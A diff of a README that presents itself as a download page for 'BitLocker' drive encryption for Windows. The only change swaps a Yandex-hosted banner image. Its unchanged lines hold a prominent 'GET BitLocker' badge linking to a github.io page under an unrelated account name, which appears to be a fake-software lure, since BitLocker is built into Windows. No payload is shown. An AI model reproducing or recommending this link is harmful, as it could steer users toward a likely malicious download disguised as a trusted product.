@@ -1,6 +1,6 @@
 # BitLocker - Complete Drive Encryption Protection for Windows
 
-![Banner Placeholder](https://avatars.mds.yandex.net/i?id=5bc254b2cfa5745c1f32fadad70fd16164fd36f1-10471913-images-thumbs&n=13)
+![Banner Placeholder](https://avatars.mds.yandex.net/i?id=1ce950f40fc4a8999ab34a970cf697150ad4490f-5878500-images-thumbs&n=13)
 
 [![GET BitLocker](https://img.shields.io/badge/GET%20%E2%80%94%20BitLocker-0078D6?style=for-the-badge&logoColor=white)](https://gpu-and-thermal-monitor.github.io/.github/bitlocker-recovery)
 
